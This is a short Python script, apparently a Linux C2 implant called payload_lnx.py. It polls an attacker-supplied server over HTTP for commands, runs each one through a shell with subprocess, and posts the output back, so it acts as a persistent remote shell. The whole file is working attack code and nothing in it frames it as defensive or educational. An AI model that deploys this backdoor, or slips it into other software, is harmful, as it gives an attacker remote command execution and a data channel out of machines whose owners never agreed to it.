import requests
import subprocess
import time
import sys

if sys.argv[1] == None:
    print("Usage: python3 payload_lnx.py \{C2_IP_ADDRESS\}")
    exit()

server_url = "http://{}:80".format(sys.argv[1])
check_interval = 5

def execute_command(command):
    """ command execution """
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        return str(e)

def main():
    while True:
        try:
            # get command from server
            response = requests.get(f"{server_url}/command", timeout=10)
            if response.status_code == 200:
                command = response.text.strip()
                if command.lower() == "exit":
                    break  # close shell
                output = execute_command(command)
                
                # send output
                requests.post(f"{server_url}/result", data={"output": output})
        except requests.RequestException:
            pass  # error ignore
        time.sleep(check_interval)

if __name__ == "__main__":
    main()